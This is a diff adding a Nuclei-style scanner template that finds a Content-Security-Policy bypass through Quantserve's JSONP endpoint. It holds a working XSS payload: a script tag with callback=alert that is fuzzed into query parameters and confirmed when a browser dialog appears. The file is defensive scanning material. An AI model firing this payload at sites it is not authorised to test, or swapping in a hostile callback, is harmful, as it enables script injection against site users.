@@ -1,0 +1,55 @@
+id: quantserve-secure-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Quantserve Secure
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,quantserve-secure
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "quantserve.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: quantserve_secure_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://secure.quantserve.com/api/segments.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "quantserve_secure_csp_xss == true"
+# digest: 490a0046304402207c4843c8e08a018ff53d2da9bf16ba9621a7641df61afd71871abc57273c755c022028e60b08bda6c00d5102c9aa9d67434b147b8a34e44e7591eae1d6fa3034a6a1:922c64590222798bb761d5b6d8e72950
